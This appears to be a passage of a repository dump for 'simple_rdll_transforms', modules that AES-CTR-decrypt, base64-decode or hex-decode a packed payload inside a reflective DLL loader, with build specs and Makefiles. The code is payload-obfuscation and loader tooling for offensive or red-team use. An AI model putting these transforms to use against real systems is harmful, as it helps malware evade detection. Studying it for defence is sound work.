static void InvCipher(state_t* state, const uint8_t* RoundKey)
{
  uint8_t round = 0;

  // Add the First round key to the state before starting the rounds.
  AddRoundKey(Nr, state, RoundKey);

  // There will be Nr rounds.
  // The first Nr-1 rounds are identical.
  // These Nr rounds are executed in the loop below.
  // Last one without InvMixColumn()
  for (round = (Nr - 1); ; --round)
  {
    InvShiftRows(state);
    InvSubBytes(state);
    AddRoundKey(round, state, RoundKey);
    if (round == 0) {
      break;
    }
    InvMixColumns(state);
  }

}
#endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)

/*****************************************************************************/
/* Public functions:                                                         */
/*****************************************************************************/
#if defined(ECB) && (ECB == 1)


void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)
{
  // The next function call encrypts the PlainText with the Key using AES algorithm.
  Cipher((state_t*)buf, ctx->RoundKey);
}

void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)
{
  // The next function call decrypts the PlainText with the Key using AES algorithm.
  InvCipher((state_t*)buf, ctx->RoundKey);
}


#endif // #if defined(ECB) && (ECB == 1)





#if defined(CBC) && (CBC == 1)


static void XorWithIv(uint8_t* buf, const uint8_t* Iv)
{
  uint8_t i;
  for (i = 0; i < AES_BLOCKLEN; ++i) // The block in AES is always 128bit no matter the key size
  {
    buf[i] ^= Iv[i];
  }
}

void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)
{
  size_t i;
  uint8_t *Iv = ctx->Iv;
  for (i = 0; i < length; i += AES_BLOCKLEN)
  {
    XorWithIv(buf, Iv);
    Cipher((state_t*)buf, ctx->RoundKey);
    Iv = buf;
    buf += AES_BLOCKLEN;
  }
  /* store Iv in ctx for next call */
  memcpy(ctx->Iv, Iv, AES_BLOCKLEN);
}

void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
{
  size_t i;
  uint8_t storeNextIv[AES_BLOCKLEN];
  for (i = 0; i < length; i += AES_BLOCKLEN)
  {
    memcpy(storeNextIv, buf, AES_BLOCKLEN);
    InvCipher((state_t*)buf, ctx->RoundKey);
    XorWithIv(buf, ctx->Iv);
    memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN);
    buf += AES_BLOCKLEN;
  }

}

#endif // #if defined(CBC) && (CBC == 1)



#if defined(CTR) && (CTR == 1)

/* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key */
void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
{
  uint8_t buffer[AES_BLOCKLEN];
  
  size_t i;
  int bi;
  for (i = 0, bi = AES_BLOCKLEN; i < length; ++i, ++bi)
  {
    if (bi == AES_BLOCKLEN) /* we need to regen xor compliment in buffer */
    {
      
      memcpy(buffer, ctx->Iv, AES_BLOCKLEN);
      Cipher((state_t*)buffer,ctx->RoundKey);

      /* Increment Iv and handle overflow */
      for (bi = (AES_BLOCKLEN - 1); bi >= 0; --bi)
      {
	/* inc will overflow */
        if (ctx->Iv[bi] == 255)
	{
          ctx->Iv[bi] = 0;
          continue;
        } 
        ctx->Iv[bi] += 1;
        break;   
      }
      bi = 0;
    }

    buf[i] = (buf[i] ^ buffer[bi]);
  }
}

#endif // #if defined(CTR) && (CTR == 1)

```

## File: simple_rdll_transforms/modules/aes/src/aes.h

```h
// Tiny AES in C (public domain) https://github.com/kokke/tiny-AES-c

#ifndef _AES_H_
#define _AES_H_

#include <stdint.h>
#include <stddef.h>

// #define the macros below to 1/0 to enable/disable the mode of operation.
//
// CBC enables AES encryption in CBC-mode of operation.
// CTR enables encryption in counter-mode.
// ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously.

// The #ifndef-guard allows it to be configured before #include'ing or at compile time.
#ifndef CBC
  #define CBC 1
#endif

#ifndef ECB
  #define ECB 1
#endif

#ifndef CTR
  #define CTR 1
#endif


#define AES128 1
//#define AES192 1
//#define AES256 1

#define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only

#if defined(AES256) && (AES256 == 1)
    #define AES_KEYLEN 32
    #define AES_keyExpSize 240
#elif defined(AES192) && (AES192 == 1)
    #define AES_KEYLEN 24
    #define AES_keyExpSize 208
#else
    #define AES_KEYLEN 16   // Key length in bytes
    #define AES_keyExpSize 176
#endif

struct AES_ctx
{
  uint8_t RoundKey[AES_keyExpSize];
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
  uint8_t Iv[AES_BLOCKLEN];
#endif
};

void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
#endif

#if defined(ECB) && (ECB == 1)
// buffer size is exactly AES_BLOCKLEN bytes; 
// you need only AES_init_ctx as IV is not used in ECB 
// NB: ECB is considered insecure for most uses
void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);
void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);

#endif // #if defined(ECB) && (ECB == !)


#if defined(CBC) && (CBC == 1)
// buffer size MUST be mutile of AES_BLOCKLEN;
// Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);

#endif // #if defined(CBC) && (CBC == 1)


#if defined(CTR) && (CTR == 1)

// Same function for encrypting as for decrypting. 
// IV is incremented for every block, and used after encryption as XOR-compliment for output
// Suggesting https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx with AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);

#endif // #if defined(CTR) && (CTR == 1)


#endif // _AES_H_

```

## File: simple_rdll_transforms/modules/aes/src/recover.c

```c
/*
 * Copyright 2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"
#include "aes.h"

void recover(_RESOURCE * rsrc);

typedef struct {
	unsigned char iv[16];
	unsigned char data[0];
} AES_PACKAGE;

/*
 * our AES key, we're going to set this via aes.spec
 */
const unsigned char aeskey[16] = { 1 };

/*
 * our recover function, in place recovers our xor'd data
 */
void aes_recover(_RESOURCE * rsrc) {
	AES_PACKAGE * package = (AES_PACKAGE *)rsrc->value;

	/* call the next module (reverse order) */
	recover(rsrc);

	/* do our AES-CTR decrypt */
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, aeskey, package->iv);
	AES_CTR_xcrypt_buffer(&ctx, (unsigned char *)package->data, rsrc->length - 16);

	/* we're going to update rsrc to take the IV out */
	rsrc->length -= 16;

	for (int x = 0; x < rsrc->length; x++)
		rsrc->value[x] = rsrc->value[x + 16];
}

```

## File: simple_rdll_transforms/modules/aes/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_transforms/modules/base64/base64.spec

```text
#
# base64 data encoding module
#

# 'init' is called by loader.spec and is our opportunity to merge in code
# and set any global values we need to set.
init.x86:
	# merge in code for XOR recovery
	load "bin/recover.x86.o"
		merge

	# layer our xor recovery function over recover
	redirect "_recover" "_base64_recover"

init.x64:
	load "bin/recover.x64.o"
		merge

	redirect "recover" "base64_recover"

# 'apply' is called by loader.spec and is our opportunity to encode the data
apply.x86:
	encode "base64"

apply.x64:
	encode "base64"

```

## File: simple_rdll_transforms/modules/base64/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_transforms/modules/base64/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/recover.c -o bin/recover.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/recover.c -o bin/recover.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_transforms/modules/base64/src/recover.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

DECLSPEC_IMPORT WINBOOL WINAPI Crypt32$CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);

void recover(_RESOURCE * rsrc);

/*
 * our recover function, in place recovers our base64'd data
 */
void base64_recover(_RESOURCE * rsrc) {
	DWORD out_len;

	/* call the next module */
	recover(rsrc);

	/* since we're in-place decoding, our out buffer is the length of our string */
	out_len = rsrc->length;

	/* decode our value */
	if (!Crypt32$CryptStringToBinaryA((LPCSTR)rsrc->value, rsrc->length, CRYPT_STRING_BASE64, (BYTE*)rsrc->value, &out_len, NULL, NULL))
		return;

	/* update our resource length */
	rsrc->length = out_len;
}

```

## File: simple_rdll_transforms/modules/base64/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_transforms/modules/hex/hex.spec

```text
#
# base64 data encoding module
#

# 'init' is called by loader.spec and is our opportunity to merge in code
# and set any global values we need to set.
init.x86:
	# merge in code for recovery
	load "bin/recover.x86.o"
		merge

	# layer our recovery function over recover
	redirect "_recover" "_hex_recover"

init.x64:
	load "bin/recover.x64.o"
		merge

	redirect "recover" "hex_recover"

# 'apply' is called by loader.spec and is our opportunity to encode the data
apply.x86:
	encode "hex"

apply.x64:
	encode "hex"

```

## File: simple_rdll_transforms/modules/hex/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_transforms/modules/hex/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/recover.c -o bin/recover.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/recover.c -o bin/recover.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_transforms/modules/hex/src/recover.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
